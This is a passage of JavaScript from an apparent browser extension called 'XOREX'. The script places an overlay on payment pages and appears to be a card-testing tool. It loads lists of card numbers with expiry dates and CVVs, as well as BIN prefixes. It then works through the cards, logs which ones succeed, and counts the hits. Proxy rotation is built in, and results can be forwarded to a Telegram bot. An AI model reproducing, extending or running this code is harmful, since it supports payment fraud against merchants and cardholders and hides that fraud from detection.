          status.textContent = "❌ Connection error. Check your inputs."
          status.className = "tg-status error"
        }
      }

      tgTestBtn.disabled = false
      tgTestBtn.textContent = "🔗 Test"
    })
  }

  const tgSaveBtn = document.getElementById("tgSaveBtn")
  if (tgSaveBtn) {
    tgSaveBtn.addEventListener("click", function() {
      const tokenInput = document.getElementById("tgModalBotToken")
      const userIdInput = document.getElementById("tgModalUserId")
      const status = document.getElementById("tgTestStatus")

      const newToken = tokenInput ? tokenInput.value.trim() : ""
      const newUserId = userIdInput ? userIdInput.value.trim() : ""

      tgBotToken = newToken
      tgUserId = newUserId
      localStorage.setItem('xorex_tg_bot_token', tgBotToken)
      localStorage.setItem('xorex_tg_user_id', tgUserId)

      if (tgBotToken && tgUserId) {
        tgForwardEnabled = true
        localStorage.setItem('xorex_tg_forward_enabled', 'true')
      }

      const settingsBtn = document.getElementById("tgSettingsBtn")
      if (settingsBtn) {
        settingsBtn.textContent = (tgBotToken && tgUserId) ? "View" : "Set"
      }

      if (status) {
        status.textContent = "💾 Settings saved!"
        status.className = "tg-status success"
        status.classList.remove("hidden")
      }

      showWarning("💾 TG settings saved!", "success")

      setTimeout(() => {
        const modal = document.getElementById("tgModal")
        if (modal) {
          modal.classList.remove("show")
          modal.classList.add("hidden")
        }
        autoRestoreAfterModal()
      }, 1000)
    })
  }

  const proxySettingsBtn = document.getElementById("proxySettingsBtn")
  if (proxySettingsBtn) {
    proxySettingsBtn.addEventListener("click", function(e) {
      e.preventDefault()
      e.stopPropagation()
      autoMinimizeForModal()

      const modal = document.getElementById("proxyModal")
      if (modal) {
        const textarea = document.getElementById("proxyTextarea")
        if (textarea) textarea.value = proxyList.join('\n')
        updateProxyCount()

        const status = document.getElementById("proxyTestStatus")
        if (status) status.classList.add("hidden")
        const infoBox = document.getElementById("proxyInfoBox")
        if (infoBox) infoBox.classList.add("hidden")

        modal.classList.remove("hidden")
        modal.classList.add("show")
      }
    })
  }

  const closeProxyModal = document.getElementById("closeProxyModal")
  if (closeProxyModal) {
    closeProxyModal.addEventListener("click", function() {
      const modal = document.getElementById("proxyModal")
      if (modal) {
        modal.classList.remove("show")
        modal.classList.add("hidden")
      }
      autoRestoreAfterModal()
    })
  }

  const proxyModeButtons = document.querySelectorAll(".proxy-mode-btn")
  proxyModeButtons.forEach(btn => {
    btn.addEventListener("click", function() {
      proxyModeButtons.forEach(b => b.classList.remove("active"))
      this.classList.add("active")
      proxyMode = this.dataset.mode
    })
  })

  const proxyClearBtn = document.getElementById("proxyClearBtn")
  if (proxyClearBtn) {
    proxyClearBtn.addEventListener("click", function() {
      const textarea = document.getElementById("proxyTextarea")
      if (textarea) textarea.value = ""
      updateProxyCount()
    })
  }

  function parseProxyList() {
    const textarea = document.getElementById("proxyTextarea")
    if (!textarea) return []
    return textarea.value.trim().split('\n')
      .map(line => line.trim())
      .filter(line => line.length > 0)
  }

  function updateProxyCount() {
    const proxies = parseProxyList()
    const countEl = document.getElementById("proxyCount")
    if (countEl) countEl.textContent = proxies.length + " prox" + (proxies.length === 1 ? "y" : "ies") + " loaded"
  }

  const proxyTextarea = document.getElementById("proxyTextarea")
  if (proxyTextarea) {
    proxyTextarea.addEventListener("input", updateProxyCount)
  }

  function parseProxyString(proxyStr) {
    proxyStr = proxyStr.trim()
    let host, port, user, pass

    if (proxyStr.includes('@')) {
      const [credentials, hostPort] = proxyStr.split('@')
      const credParts = credentials.split(':')
      user = credParts[0]
      pass = credParts.slice(1).join(':')
      const hpParts = hostPort.split(':')
      host = hpParts[0]
      port = hpParts[1]
    } else {
      const parts = proxyStr.split(':')
      if (parts.length === 4) {
        host = parts[0]
        port = parts[1]
        user = parts[2]
        pass = parts[3]
      } else if (parts.length === 2) {
        host = parts[0]
        port = parts[1]
      } else {
        return null
      }
    }

    if (!host || !port) return null
    return { host, port, user: user || null, pass: pass || null }
  }

  const proxyTestBtn = document.getElementById("proxyTestBtn")
  if (proxyTestBtn) {
    proxyTestBtn.addEventListener("click", async function() {
      const proxies = parseProxyList()
      const status = document.getElementById("proxyTestStatus")
      const infoBox = document.getElementById("proxyInfoBox")
      const infoDetails = document.getElementById("proxyInfoDetails")

      if (proxies.length === 0) {
        if (status) {
          status.textContent = "❌ Please add at least one proxy"
          status.className = "proxy-status error"
          status.classList.remove("hidden")
        }
        return
      }

      const testProxy = proxies[0]
      const parsed = parseProxyString(testProxy)
      if (!parsed) {
        if (status) {
          status.textContent = "❌ Invalid proxy format: " + testProxy
          status.className = "proxy-status error"
          status.classList.remove("hidden")
        }
        return
      }

      proxyTestBtn.disabled = true
      proxyTestBtn.textContent = "⏳ Testing..."

      if (status) {
        status.textContent = "🔄 Testing proxy connection..."
        status.className = "proxy-status pending"
        status.classList.remove("hidden")
      }

      try {
        const result = await sendToBackground({
          type: "TEST_PROXY",
          proxy: parsed
        })

        if (result && result.success) {
          if (status) {
            status.textContent = "✅ Proxy is working!"
            status.className = "proxy-status success"
          }
          if (infoBox && infoDetails) {
            const info = result.info || {}
            infoDetails.innerHTML = `
              <div class="proxy-info-item"><span>🌍 IP:</span> <strong>${info.ip || 'Unknown'}</strong></div>
              <div class="proxy-info-item"><span>📍 Location:</span> <strong>${info.country || '?'}${info.city ? ', ' + info.city : ''}</strong></div>
              <div class="proxy-info-item"><span>🏢 ISP:</span> <strong>${info.org || 'Unknown'}</strong></div>
              <div class="proxy-info-item"><span>⏱ Latency:</span> <strong>${info.latency || '?'}ms</strong></div>
            `
            infoBox.classList.remove("hidden")
          }
          showWarning("✅ Proxy working!", "success")
        } else {
          if (status) {
            status.textContent = "❌ " + (result?.error || "Proxy connection failed")
            status.className = "proxy-status error"
          }
          if (infoBox) infoBox.classList.add("hidden")
        }
      } catch (err) {
        if (status) {
          status.textContent = "❌ Test failed: " + (err.message || "Unknown error")
          status.className = "proxy-status error"
        }
      }

      proxyTestBtn.disabled = false
      proxyTestBtn.textContent = "🔍 Test"
    })
  }

  const proxySaveBtn = document.getElementById("proxySaveBtn")
  if (proxySaveBtn) {
    proxySaveBtn.addEventListener("click", function() {
      const proxies = parseProxyList()
      const status = document.getElementById("proxyTestStatus")

      proxyList = proxies
      proxyMode = document.querySelector(".proxy-mode-btn.active")?.dataset.mode || 'rotating'
      proxyEnabled = proxies.length > 0
      currentProxyIndex = 0

      localStorage.setItem('xorex_proxy_list', JSON.stringify(proxyList))
      localStorage.setItem('xorex_proxy_mode', proxyMode)
      localStorage.setItem('xorex_proxy_enabled', proxyEnabled.toString())

      window.postMessage({
        type: 'XOREX_STORAGE_REQUEST',
        requestId: 'proxy_save_' + Date.now(),
        action: 'SET',
        data: {
          'xorex_proxy_list': proxyList,
          'xorex_proxy_mode': proxyMode,
          'xorex_proxy_enabled': proxyEnabled
        }
      }, '*')

      const settingsBtn = document.getElementById("proxySettingsBtn")
      if (settingsBtn) {
        settingsBtn.textContent = proxyList.length > 0 ? "View" : "Set"
      }

      if (status) {
        status.textContent = "💾 " + proxyList.length + " prox" + (proxyList.length === 1 ? "y" : "ies") + " saved!"
        status.className = "proxy-status success"
        status.classList.remove("hidden")
      }

      showWarning("💾 Proxy settings saved!", "success")

      setTimeout(() => {
        const modal = document.getElementById("proxyModal")
        if (modal) {
          modal.classList.remove("show")
          modal.classList.add("hidden")
        }
        autoRestoreAfterModal()
      }, 1000)
    })
  }

    function isValidHexColor(hex) {
    return /^#[0-9A-Fa-f]{6}$/.test(hex)
  }

  function updateBgColor(color) {
    if (!isValidHexColor(color)) return
    pageBackgroundColor = color
    hasCustomColor = true
    _bgProcessed = new WeakSet()
    _lastAppliedBgColor = null
    saveBgColorSetting(bgColorEnabled, color, true)
    const colorInput = document.getElementById("pageBgColorInput")
    if (colorInput) colorInput.value = color
    if (bgColorEnabled) {
      applyCustomStyles()
    }
  }

  function showBgInfoModal() {

    const overlay = document.querySelector(".card-generator-overlay")
    if (overlay && !isMinimized) {
      isMinimized = true
      overlay.classList.add("minimized")
      const minimizeBtn = document.getElementById("minimizeBtn")
      if (minimizeBtn) {
        minimizeBtn.innerHTML = "✦"
        minimizeBtn.title = "Open panel"
      }
    }

    const modal = document.getElementById("bgInfoModal")
    if (modal) {
      modal.classList.remove("hidden")
      modal.classList.add("show")
    }
  }

  function setupBgColorHandlers() {

    const bgColorToggle = document.getElementById("bgColorToggle")
    if (bgColorToggle) {
      bgColorToggle.addEventListener("change", function () {
        bgColorEnabled = this.checked
        _bgProcessed = new WeakSet()
        _lastAppliedBgColor = null
        saveBgColorSetting(bgColorEnabled, pageBackgroundColor, hasCustomColor)

        const colorSettingsBox = document.getElementById("colorSettingsBox")
        if (colorSettingsBox) {
          colorSettingsBox.classList.toggle("hidden", !bgColorEnabled)
        }
        if (bgColorEnabled) {

          showBgInfoModal()

          if (!hasCustomColor) {
            sessionRandomColor = getRandomBgColor();
          }
          applyCustomStyles()
        } else {

          document.documentElement.style.removeProperty('background')
          document.documentElement.style.removeProperty('background-color')
          document.body.style.removeProperty('background')
          document.body.style.removeProperty('background-color')
          location.reload()
        }
      })
    }

    const pageBgColorInput = document.getElementById("pageBgColorInput")
    if (pageBgColorInput) {
      pageBgColorInput.addEventListener("input", function () {
        updateBgColor(this.value)
      })
    }
  }

  function setupHistoryHandlers() {
    const clearHistory = document.getElementById("clearHistory")
    if (clearHistory) {
      clearHistory.addEventListener("click", () => {
        cardHistory = []
        localStorage.removeItem(K.LOGS)
        const clearedAt = new Date().toISOString()
        localStorage.setItem(K.LOGS_CLEARED_AT, clearedAt)
        saveToGlobalStorage(K.LOGS, [])
        saveToGlobalStorage(K.LOGS_CLEARED_AT, clearedAt)
        updateHistoryDisplay()
        showWarning("✅ Logs cleared", "success")
      })
    }
  }

    setupBgColorHandlers()

    setupHistoryHandlers()

    const closeBgInfoModalBtn = document.getElementById("closeBgInfoModal")
    const bgInfoOkBtn = document.getElementById("bgInfoOkBtn")

    if (closeBgInfoModalBtn) {
      closeBgInfoModalBtn.addEventListener("click", function() {
        const modal = document.getElementById("bgInfoModal")
        if (modal) {
          modal.classList.remove("show")
          modal.classList.add("hidden")
        }

        autoRestoreAfterModal()
      })
    }
    if (bgInfoOkBtn) {
      bgInfoOkBtn.addEventListener("click", function() {
        const modal = document.getElementById("bgInfoModal")
        if (modal) {
          modal.classList.remove("show")
          modal.classList.add("hidden")
        }

        autoRestoreAfterModal()
      })
    }
  }

  async function validateToken(token) {
    return { success: false, message: "Offline mode" }
  }

  async function validateSavedToken(token) {
    return false
  }

  window.addEventListener('message', async (event) => {
    if (event.data && event.data.type === 'XOREX_STORAGE_CHANGED') {
      const changes = event.data.changes || {};

      if (changes[K.SAVED_BINS] !== undefined && Array.isArray(changes[K.SAVED_BINS])) {
        savedBINs = changes[K.SAVED_BINS];
        currentBinIndex = 0;
        localStorage.setItem(K.SAVED_BINS, JSON.stringify(savedBINs));
        rebuildBinListUI();
      }

      if (changes[K.CUSTOM_NAME] !== undefined) {
        customName = changes[K.CUSTOM_NAME];
        localStorage.setItem(K.CUSTOM_NAME, customName);
        const nameInput = document.getElementById('customNameInput');
        if (nameInput) nameInput.value = customName;
      }
      if (changes[K.CUSTOM_EMAIL] !== undefined) {
        customEmail = changes[K.CUSTOM_EMAIL];
        localStorage.setItem(K.CUSTOM_EMAIL, customEmail);
        const emailInput = document.getElementById('customEmailInput');
        if (emailInput) emailInput.value = customEmail;
      }

      if (changes[K.TOGGLE_HIT_SOUND] !== undefined) {
        localStorage.setItem(K.TOGGLE_HIT_SOUND, changes[K.TOGGLE_HIT_SOUND]);
      }
      if (changes[K.TOGGLE_AUTO_SS] !== undefined) {
        localStorage.setItem(K.TOGGLE_AUTO_SS, changes[K.TOGGLE_AUTO_SS]);
      }

      if (changes[K.SAVED_ID] !== undefined) {
        savedId = changes[K.SAVED_ID];
        localStorage.setItem(K.SAVED_ID, savedId);
      }

      if (changes[K.BG_COLOR] !== undefined) {
        pageBackgroundColor = changes[K.BG_COLOR];
        localStorage.setItem(K.BG_COLOR, changes[K.BG_COLOR]);
      }
      if (changes[K.HAS_CUSTOM_COLOR] !== undefined) {
        localStorage.setItem(K.HAS_CUSTOM_COLOR, changes[K.HAS_CUSTOM_COLOR]);
      }
      if (changes[K.BG_ENABLED] !== undefined) {
        localStorage.setItem(K.BG_ENABLED, changes[K.BG_ENABLED]);
      }
      if (changes[K.PAGE_BG_COLOR] !== undefined) {
        localStorage.setItem(K.PAGE_BG_COLOR, changes[K.PAGE_BG_COLOR]);
      }
      if (changes[K.PAGE_HAS_CUSTOM] !== undefined) {
        userHasSetCustomColor = changes[K.PAGE_HAS_CUSTOM] === true || changes[K.PAGE_HAS_CUSTOM] === 'true';
      }

      if (changes[K.LOGS] !== undefined) {
        let logs = changes[K.LOGS];
        if (typeof logs === 'string') try { logs = JSON.parse(logs); } catch(e) { logs = []; }
        if (Array.isArray(logs)) {
          cardHistory = logs;
          localStorage.setItem(K.LOGS, JSON.stringify(logs));
        }
      }
      if (changes[K.LOGS_CLEARED_AT] !== undefined) {
        localStorage.setItem(K.LOGS_CLEARED_AT, changes[K.LOGS_CLEARED_AT]);
      }

      if (changes[K.PROXY_ENABLED] !== undefined) {
        localStorage.setItem(K.PROXY_ENABLED, changes[K.PROXY_ENABLED]);
      }
      if (changes[K.PROXY_STRING] !== undefined) {
        localStorage.setItem(K.PROXY_STRING, changes[K.PROXY_STRING]);
      }
      if (changes[K.PROXY_INFO] !== undefined) {
        localStorage.setItem(K.PROXY_INFO, typeof changes[K.PROXY_INFO] === 'object' ? JSON.stringify(changes[K.PROXY_INFO]) : changes[K.PROXY_INFO]);
      }

      if (changes[K.MUSIC_NAME] !== undefined) {
        localStorage.setItem(K.MUSIC_NAME, changes[K.MUSIC_NAME]);
      }

      if (changes[K.CARD_HISTORY] !== undefined) {
        let hist = changes[K.CARD_HISTORY];
        if (typeof hist === 'string') try { hist = JSON.parse(hist); } catch(e) { hist = []; }
        if (Array.isArray(hist)) localStorage.setItem(K.CARD_HISTORY, JSON.stringify(hist));
      }

      if (changes[K.LAST_SEEN_BIN_TIME] !== undefined) {
        localStorage.setItem(K.LAST_SEEN_BIN_TIME, changes[K.LAST_SEEN_BIN_TIME]);
      }
    }
  });

  function rebuildBinListUI() {
    const binListContainer = document.getElementById('binListContainer');
    if (!binListContainer) return;

    binListContainer.innerHTML = '';

    savedBINs.forEach((bin, i) => {
      const row = document.createElement('div');
      row.className = 'bin-row';
      row.style.cssText = 'display:flex;gap:6px;margin-bottom:4px;align-items:center;';

      const input = document.createElement('input');
      input.type = 'text';
      input.className = 'bin-input';
      input.value = bin;
      input.maxLength = 8;
      input.placeholder = 'Enter BIN';
      input.dataset.index = i;
      input.addEventListener('input', () => {
        savedBINs[i] = input.value.replace(/\D/g, '');
      });

      if (i === 0) {
        const addBtn = document.createElement('button');
        addBtn.className = 'bin-add-btn';
        addBtn.textContent = '+';
        addBtn.addEventListener('click', () => {
          savedBINs.push('');
          rebuildBinListUI();
        });
        row.appendChild(input);
        row.appendChild(addBtn);
      } else {
        const removeBtn = document.createElement('button');
        removeBtn.className = 'bin-remove-btn';
        removeBtn.textContent = '-';
        removeBtn.addEventListener('click', () => {
          savedBINs.splice(i, 1);
          saveBINs(savedBINs);
          rebuildBinListUI();
        });
        row.appendChild(input);
        row.appendChild(removeBtn);
      }

      binListContainer.appendChild(row);
    });

    if (savedBINs.length === 0) {
      savedBINs.push('');
      rebuildBinListUI();
    }
  }

  window.addEventListener("message", (event) => {
    if (event.data && event.data.type === "EXTENSION_INVALIDATED") {
      setTimeout(() => {
        window.postMessage({ type: "GET_LOGIN_STATE" }, "*")
      }, 2000)
    }
  })

  function setMode(mode) {
    currentMode = mode
    document.querySelectorAll(".mode-btn").forEach((btn) => {
      btn.classList.toggle("active", btn.dataset.mode === mode)
    })
    const binSection = document.getElementById("binSection")
    const ccSection = document.getElementById("ccSection")
    if (mode === "bin") {
      binSection?.classList.remove("hidden")
      ccSection?.classList.add("hidden")
    } else {
      binSection?.classList.add("hidden")
      ccSection?.classList.remove("hidden")
    }
  }
  function updateCcCount() {
    const ccTextarea = document.getElementById("ccTextarea")
    const ccCount = document.getElementById("ccCount")
    if (!ccTextarea || !ccCount) return
    const lines = ccTextarea.value.split("\n").filter((line) => line.trim() && line.includes("|"))
    ccCount.textContent = Math.min(lines.length, 20)
  }
  function saveCcListFunc() {
    const ccTextarea = document.getElementById("ccTextarea")
    if (!ccTextarea) return
    const lines = ccTextarea.value
      .split("\n")
      .map((line) => line.trim())
      .filter((line) => {
        const parts = line.split("|")
        return parts.length === 4 && parts[0].length >= 13
      })
      .slice(0, 20)
    ccList = lines
    currentCCIndex = 0
    const ccInfo = document.querySelector(".cc-info")
    if (ccInfo) ccInfo.textContent = `${ccList.length} cards loaded`
    const modal = document.getElementById("ccModal")
    modal.classList.remove("show")
    setTimeout(() => modal.classList.add("hidden"), 400)
    showWarning(`✅ ${ccList.length} cards saved`, "success")
  }
  function getNextCC() {
    if (ccList.length === 0 || currentCCIndex >= ccList.length) {
      return null
    }
    const cc = ccList[currentCCIndex]
    currentCCIndex++
    const parts = cc.split("|")
    return {
      number: parts[0],
      month: parts[1],
      year: parts[2],
      cvv: parts[3],
    }
  }
  function toggleCollapsible(contentId, header) {
    const content = document.getElementById(contentId)
    const icon = header.querySelector(".collapse-icon")
    if (content.classList.contains("open")) {
      content.classList.remove("open")
      icon.textContent = "▼"
    } else {
      content.classList.add("open")
      icon.textContent = "▲"
    }
  }
  function addToHistory(card, mm, yy, cvv, response) {
    const entry = {
      card: `${card}|${mm}|${yy}|${cvv}`,
      response: response,
      time: new Date().toLocaleTimeString(),
    }
    cardHistory.unshift(entry)
    if (cardHistory.length > 50) cardHistory.pop()
    saveCardHistory()
    updateHistoryDisplay()
    updateStats()
  }
  function updateHistoryDisplay() {
    const historyList = document.getElementById("historyList")
    if (!historyList) return
    if (cardHistory.length === 0) {
      historyList.innerHTML = '<div class="history-empty">No logs yet</div>'
      return
    }
    const logsToShow = cardHistory.slice(0, 50)
    historyList.innerHTML = logsToShow
      .map(
        (entry, index) => `
    <div class="history-item ${entry.response === "SUCCESS" ? "success" : "error"}">
      <div class="history-main">
        <div class="history-card-line">
          <span class="history-card">${entry.card}</span>
          <button class="history-copy" data-card="${entry.card}" data-index="${index}">📋</button>
        </div>
        <div class="history-response">${entry.response}</div>
      </div>
    </div>
  `,
      )
      .join("")
    historyList.querySelectorAll(".history-copy").forEach((btn) => {
      btn.addEventListener("click", function () {
        const card = this.getAttribute("data-card")
        if (card) {
          navigator.clipboard
            .writeText(card)
            .then(() => {
              this.textContent = "✓"
              setTimeout(() => {
                this.textContent = "📋"
              }, 1000)
            })
            .catch(() => {
              window.postMessage({ type: "COPY_TO_CLIPBOARD_TEXT", text: card }, "*")
              this.textContent = "✓"
              setTimeout(() => {
                this.textContent = "📋"
              }, 1000)
            })
        }
      })
    })
  }
  function updateStats(serverAttempts, serverHits) {
    const attemptsEl = document.getElementById("statAttempts")
    const successEl = document.getElementById("statSuccess")
    const attempts = serverAttempts !== undefined ? serverAttempts : attemptCount
    const hits = serverHits !== undefined ? serverHits : cardHistory.filter((h) => h.response === "SUCCESS").length
    if (attemptsEl) attemptsEl.textContent = attempts
    if (successEl) successEl.textContent = hits
  }
  window.addEventListener("message", (event) => {
    if (event.source !== window) return
    switch (event.data.type) {
      case "UPDATE_SAVED_BIN":
        if (event.data.bin) {
          if (savedBINs.length === 0) {
            savedBINs = [event.data.bin]
          }
          const binInput = document.getElementById("binInput1")
          if (binInput && !binInput.value) {
            binInput.value = event.data.bin
          }
          updateBinStatus()
        }
        break
      case "UPDATE_SAVED_ID":
        if (event.data.id) {
          savedId = event.data.id
          updateIdStatus()
        }
        break
      case "UPDATE_TOGGLE_STATES":
        break
      case "UPDATE_LOGIN_STATE":
        if (event.data.userId && !isLoggedIn) {
          userId = event.data.userId || ""
          userFirstName = event.data.firstName || ""
          isLoggedIn = true
          if (userId) localStorage.setItem(K.USER_ID, userId)
          if (userFirstName) localStorage.setItem(K.FIRST_NAME, userFirstName)
          const loginScreen = document.getElementById("loginScreen")
          const dashboard = document.getElementById("mainDashboard")
          if (loginScreen) loginScreen.classList.add("hidden")
          if (dashboard) dashboard.classList.remove("hidden")
        }
        break
      case "PROXY_CLEARED_FROM_POPUP":
        localStorage.removeItem(K.PROXY_STRING)
        localStorage.removeItem(K.PROXY_ENABLED)
        const proxyBtn = document.getElementById("proxyViewBtn")
        if (proxyBtn) {
          proxyBtn.textContent = "Set"
        }
        showWarning("Proxy cleared", "info")
        break
    }
  })
  function createPageWatermark() {
    if (document.getElementById("xorex-page-watermark")) return
    const watermark = document.createElement("div")
    watermark.id = "xorex-page-watermark"
    watermark.className = "xorex-page-watermark"
    watermark.innerHTML = `
    <div class="xorex-wm-line"></div>
    <span>X</span>
    <span>O</span>
    <span>R</span>
    <span>E</span>
    <span>X</span>
    <div class="xorex-wm-line"></div>
  `
    document.body.appendChild(watermark)
  }

  ;(function initOnce() {
    if (window.__XOREXOverlayInit) return
    window.__XOREXOverlayInit = true
    if (window !== window.top) return
    function tryCreateOverlay() {
      if (document.body) {
                waitForPaymentPage(async (isPayment) => {
          if (isPayment) {
            isDashboardActive = true
            await createOverlay()
            createPageWatermark()

            autoExtractPaymentFromUrl()
            applyCustomStyles()
          }
        }, 10)
      } else {
        setTimeout(tryCreateOverlay, 50)
      }
    }
    if (document.readyState === "loading") {
      document.addEventListener("DOMContentLoaded", tryCreateOverlay, { once: true })
    } else {
      tryCreateOverlay()
    }
  })()
}
